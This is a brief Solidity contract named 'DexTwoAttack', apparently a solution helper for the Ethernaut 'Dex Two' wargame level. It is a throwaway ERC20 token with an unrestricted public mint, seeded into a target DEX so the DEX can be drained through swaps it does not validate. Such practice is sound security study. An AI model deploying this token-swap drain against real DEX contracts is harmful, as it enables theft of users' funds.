// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract DexTwoAttack is ERC20 {
  address private _dex;
  constructor(address _dexTwo, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _mint(_dexTwo, 1);
  }

  function mint(uint _amount) public {
    _mint(msg.sender, _amount);
  }
}
